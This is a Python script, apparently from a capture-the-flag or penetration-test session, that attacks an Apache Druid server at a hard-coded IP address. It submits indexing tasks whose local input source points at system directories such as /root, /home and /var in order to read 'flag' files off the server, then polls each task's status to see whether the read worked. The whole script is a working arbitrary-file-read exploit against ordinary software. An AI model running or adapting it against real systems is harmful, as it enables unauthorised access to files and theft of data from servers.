import requests
import json
import time

# Try reading from root or common locations
files_to_try = [
    ("/", "flag*"),
    ("/tmp", "flag*"),
    ("/root", "flag*"),
    ("/opt", "flag*"),
    ("/home", "flag*"),
    ("/var", "flag*"),
]

for base, filter_pat in files_to_try:
    task_id = f"fileread_{base.replace('/', '_')}"
    payload = {
        "type": "index_parallel",
        "spec": {
            "dataSchema": {
                "dataSource": f"fs_{hash(base) % 10000}",
                "timestampSpec": {"column": "timestamp", "format": "epoch", "missingValue": "2024-01-01T00:00:00Z"},
                "dimensionsSpec": {"dimensions": ["data"]},
                "metricsSpec": [],
                "granularitySpec": {
                    "type": "uniform",
                    "segmentGranularity": "HOUR",
                    "queryGranularity": "NONE",
                    "rollup": False
                },
                "transformSpec": {"filter": None, "transforms": []}
            },
            "ioConfig": {
                "type": "index_parallel",
                "inputSource": {"type": "local", "baseDir": base, "filter": filter_pat},
                "inputFormat": {"type": "csv", "columns": ["data"]},
                "appendToExisting": False
            },
            "tuningConfig": {"type": "index_parallel", "maxRowsPerSegment": 5000000}
        }
    }

    try:
        resp = requests.post("http://222.20.126.52:32936/druid/indexer/v1/task", json=payload, headers={"Content-Type": "application/json"}, timeout=10)
        task = resp.json().get("task", "")
        time.sleep(5)
        status_resp = requests.get(f"http://222.20.126.52:32936/druid/indexer/v1/task/{task}/status", timeout=10)
        status_data = status_resp.json()
        sc = status_data.get("status", {}).get("statusCode", "UNKNOWN")
        print(f"{base}/{filter_pat}: {sc}")
        if sc == "SUCCESS":
            print(f"  SUCCESS! task={task}")
    except Exception as e:
        print(f"{base}/{filter_pat}: ERROR - {e}")
PYEOF
